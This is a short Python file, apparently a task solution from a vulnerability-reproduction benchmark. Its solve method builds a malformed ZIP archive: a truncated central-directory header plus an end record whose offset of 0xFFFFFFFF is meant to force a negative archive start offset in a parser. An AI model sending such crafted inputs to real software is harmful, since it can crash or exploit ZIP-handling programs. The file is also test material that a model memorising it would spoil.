import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        prefix = b"PK\x01\x02" + (b"\x00" * 20)  # 24 bytes: partial central directory header
        eocd = b"PK\x05\x06" + struct.pack(
            "<HHHHIIH",
            0,          # disk number
            0,          # start disk number
            1,          # entries on this disk
            1,          # total entries
            24,         # central directory size
            0xFFFFFFFF, # central directory offset (forces negative archive start offset after adjustment)
            0           # comment length
        )
        return prefix + eocd